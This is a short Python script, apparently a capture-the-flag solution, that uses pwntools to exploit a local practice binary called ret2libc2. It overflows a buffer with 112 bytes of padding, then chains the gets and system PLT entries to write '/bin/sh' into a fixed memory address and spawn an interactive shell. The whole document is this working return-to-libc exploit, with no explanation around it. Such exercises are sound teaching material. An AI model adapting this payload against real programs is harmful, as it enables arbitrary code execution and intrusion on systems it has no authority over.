#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

#binsh_addr = 0x0804A038
binsh_addr =0x0804A065
system_plt = 0x8048490
gets_plt = 0x8048460

payload = flat(['a' * 112, gets_plt, system_plt, binsh_addr,binsh_addr])

sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
